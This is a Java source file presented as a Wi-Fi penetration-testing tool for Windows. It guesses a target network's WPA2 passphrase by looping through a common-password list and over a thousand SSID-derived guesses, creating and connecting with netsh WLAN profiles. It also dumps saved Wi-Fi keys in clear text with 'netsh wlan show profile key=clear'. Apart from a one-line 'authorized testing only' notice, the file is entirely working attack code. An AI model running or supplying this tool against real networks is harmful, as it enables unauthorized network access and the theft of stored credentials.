import java.io.*;
import java.util.*;
import java.util.concurrent.*;

public class WiFiPentestTool {
    
    private static final String[] COMMON_PASSWORDS = {
        "password", "12345678", "123456789", "qwertyuip", "abc123",
        "password123", "admin", "letmein", "welcome", "monkey",
        "1234567890", "dragon", "rockyou", "princess", "football"
    };
    
    public static void main(String[] args) {
        if (args.length < 1) {
            System.out.println("Usage: java WiFiPentestTool <SSID>");
            System.exit(1);
        }
        
        String targetSSID = args[0];
        WiFiPentestTool tool = new WiFiPentestTool();
        
        System.out.println("Starting WiFi penetration test for: " + targetSSID);
        System.out.println("This tool is for authorized testing only!\n");
        
        // Method 1: Try common passwords
        tool.tryCommonPasswords(targetSSID);
        
        // Method 2: Generate probable passwords
        tool.tryGeneratedPasswords(targetSSID);
        
        // Method 3: Extract saved passwords (Windows)
        tool.extractSavedPasswords(targetSSID);
    }
    
    private void tryCommonPasswords(String ssid) {
        System.out.println("Testing common passwords...");
        
        for (String password : COMMON_PASSWORDS) {
            if (testWiFiConnection(ssid, password)) {
                System.out.println("SUCCESS! Password found: " + password);
                return;
            }
            System.out.println("Tested: " + password + " - Failed");
        }
    }
    
    private void tryGeneratedPasswords(String ssid) {
        System.out.println("\nGenerating probable passwords based on SSID...");
        
        List<String> probablePasswords = generateProbablePasswords(ssid);
        
        for (String password : probablePasswords) {
            if (testWiFiConnection(ssid, password)) {
                System.out.println("SUCCESS! Password found: " + password);
                return;
            }
            System.out.println("Tested: " + password + " - Failed");
        }
    }
    
    private List<String> generateProbablePasswords(String ssid) {
        List<String> passwords = new ArrayList<>();
        String lowerSSID = ssid.toLowerCase();
        
        // Common patterns
        passwords.add(lowerSSID + "123");
        passwords.add(lowerSSID + "2023");
        passwords.add(lowerSSID + "2024");
        passwords.add(lowerSSID + "password");
        passwords.add(lowerSSID + "admin");
        passwords.add("admin" + lowerSSID);
        passwords.add(lowerSSID + lowerSSID);
        
        // Numeric variations
        for (int i = 0; i <= 999; i++) {
            passwords.add(lowerSSID + String.format("%03d", i));
        }
        
        // Phone number patterns
        passwords.add("5551234567");
        passwords.add("1234567890");
        
        return passwords;
    }
    
    private boolean testWiFiConnection(String ssid, String password) {
        try {
            // Create temporary netsh profile for testing
            String profileXML = createWiFiProfile(ssid, password);
            File tempProfile = File.createTempFile("wifi_test", ".xml");
            
            try (FileWriter writer = new FileWriter(tempProfile)) {
                writer.write(profileXML);
            }
            
            // Add profile and test connection
            ProcessBuilder pb1 = new ProcessBuilder("netsh", "wlan", "add", "profile", 
                "filename=" + tempProfile.getAbsolutePath());
            Process p1 = pb1.start();
            p1.waitFor(5, TimeUnit.SECONDS);
            
            // Attempt connection
            ProcessBuilder pb2 = new ProcessBuilder("netsh", "wlan", "connect", 
                "ssid=" + ssid, "name=" + ssid);
            Process p2 = pb2.start();
            p2.waitFor(10, TimeUnit.SECONDS);
            
            // Check if connected
            boolean connected = isConnectedToSSID(ssid);
            
            // Cleanup
            ProcessBuilder pb3 = new ProcessBuilder("netsh", "wlan", "delete", "profile", ssid);
            pb3.start().waitFor(3, TimeUnit.SECONDS);
            tempProfile.delete();
            
            return connected;
            
        } catch (Exception e) {
            return false;
        }
    }
    
    private String createWiFiProfile(String ssid, String password) {
        return "<?xml version=\"1.0\"?>\n" +
               "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
               "    <name>" + ssid + "</name>\n" +
               "    <SSIDConfig>\n" +
               "        <SSID>\n" +
               "            <name>" + ssid + "</name>\n" +
               "        </SSID>\n" +
               "    </SSIDConfig>\n" +
               "    <connectionType>ESS</connectionType>\n" +
               "    <connectionMode>auto</connectionMode>\n" +
               "    <MSM>\n" +
               "        <security>\n" +
               "            <authEncryption>\n" +
               "                <authentication>WPA2PSK</authentication>\n" +
               "                <encryption>AES</encryption>\n" +
               "                <useOneX>false</useOneX>\n" +
               "            </authEncryption>\n" +
               "            <sharedKey>\n" +
               "                <keyType>passPhrase</keyType>\n" +
               "                <protected>false</protected>\n" +
               "                <keyMaterial>" + password + "</keyMaterial>\n" +
               "            </sharedKey>\n" +
               "        </security>\n" +
               "    </MSM>\n" +
               "</WLANProfile>";
    }
    
    private boolean isConnectedToSSID(String ssid) {
        try {
            ProcessBuilder pb = new ProcessBuilder("netsh", "wlan", "show", "interfaces");
            Process process = pb.start();
            
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("SSID") && line.contains(ssid)) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            // Ignore
        }
        return false;
    }
    
    private void extractSavedPasswords(String targetSSID) {
        System.out.println("\nExtracting saved WiFi passwords...");
        
        try {
            // Get saved profiles
            ProcessBuilder pb = new ProcessBuilder("netsh", "wlan", "show", "profiles");
            Process process = pb.start();
            
            List<String> profiles = new ArrayList<>();
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("All User Profile")) {
                        String profile = line.split(":")[1].trim();
                        profiles.add(profile);
                    }
                }
            }
            
            // Extract passwords for each profile
            for (String profile : profiles) {
                if (profile.equalsIgnoreCase(targetSSID)) {
                    String password = extractPassword(profile);
                    if (password != null) {
                        System.out.println("FOUND SAVED PASSWORD for " + profile + ": " + password);
                        return;
                    }
                }
            }
            
        } catch (Exception e) {
            System.out.println("Could not extract saved passwords: " + e.getMessage());
        }
    }
    
    private String extractPassword(String profileName) {
        try {
            ProcessBuilder pb = new ProcessBuilder("netsh", "wlan", "show", "profile", 
                profileName, "key=clear");
            Process process = pb.start();
            
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("Key Content")) {
                        return line.split(":")[1].trim();
                    }
                }
            }
        } catch (Exception e) {
            // Ignore
        }
        return null;
    }
}
